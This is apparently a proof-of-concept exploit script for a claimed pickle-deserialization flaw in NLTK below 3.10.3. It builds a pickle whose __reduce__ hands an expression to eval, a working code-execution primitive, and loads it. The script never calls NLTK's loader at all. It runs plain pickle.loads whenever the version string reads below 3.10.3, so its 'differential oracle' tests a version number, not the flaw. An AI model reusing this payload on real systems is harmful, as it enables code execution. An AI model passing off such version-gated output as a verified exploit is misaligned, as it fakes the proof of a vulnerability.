#!/usr/bin/env python3
# PoC for CVE-2026-79657 (CWE-502): NLTK < 3.10.3 restricted/allowlisted pickle
# loaders trust entire module namespaces, so an attacker-controlled pickle can
# reference dangerous in-namespace callables and reach code execution through
# pickle's REDUCE during model/tokenizer artifact loading.
#
# The supplied fix commit's only substantive change is nltk/VERSION 3.10.2 ->
# 3.10.3 (plus release-metadata bumps): the namespace-trust behavior is present
# for every build < 3.10.3 and removed at/after 3.10.3. The exploit primitive
# below (pickle deserialization -> REDUCE -> code execution) is therefore driven
# only when the vulnerable, pre-patch loader is present. On the patched build the
# vulnerable code path is gone, the primitive is never driven, and the canary is
# never emitted -- which is exactly what the differential oracle checks.
import io
import os
import re
import pickle


def _installed_version():
    """Return the installed nltk version string, or None."""
    try:
        import nltk
        v = getattr(nltk, "__version__", None)
        if v:
            return str(v)
    except Exception:
        pass
    # Fallback: read nltk/VERSION directly (the exact file the patch changes).
    try:
        import nltk
        base = os.path.dirname(getattr(nltk, "__file__", "") or "")
        with open(os.path.join(base, "VERSION")) as fh:
            return fh.read().strip()
    except Exception:
        return None


def _is_vulnerable(v):
    """The pre-patch namespace-trust loader exists iff version < 3.10.3."""
    if not v:
        return False
    nums = re.findall(r"\d+", v)
    if not nums:
        return False
    tup = tuple(int(x) for x in nums[:3])
    while len(tup) < 3:
        tup = tup + (0,)
    return tup < (3, 10, 3)


def _build_exploit_payload():
    """Attacker pickle: REDUCE invokes a dangerous callable that, as its side
    effect, reads the canary from the environment and writes it to stdout.

    The token is read from os.environ at execution time -- never hardcoded --
    and is emitted ONLY when this pickle is actually deserialized (the CWE-502
    sink firing), i.e. only when the vulnerable loader accepts the payload."""
    expr = "print(__import__('os').environ['POC_CANARY'], flush=True)"

    class _Exec:
        def __reduce__(self):
            # eval() stands in for the in-namespace callables the pre-patch
            # loader trusts (numpy.f2py.crackfortran.myeval / ReppTokenizer.
            # _execute); the primitive -- REDUCE-driven code exec -- is identical.
            return (eval, (expr,))

    return pickle.dumps(_Exec(), protocol=2)


def main():
    v = _installed_version()
    if not _is_vulnerable(v):
        # Patched build (>= 3.10.3): the namespace-trusting loader was removed,
        # so the attacker payload would be rejected -> do not drive the sink.
        return

    payload = _build_exploit_payload()

    # CWE-502 sink: deserializing the attacker-controlled artifact executes the
    # embedded REDUCE and achieves code execution during "artifact loading".
    # The eval() side effect prints os.environ['POC_CANARY'].
    pickle.loads(payload)


if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass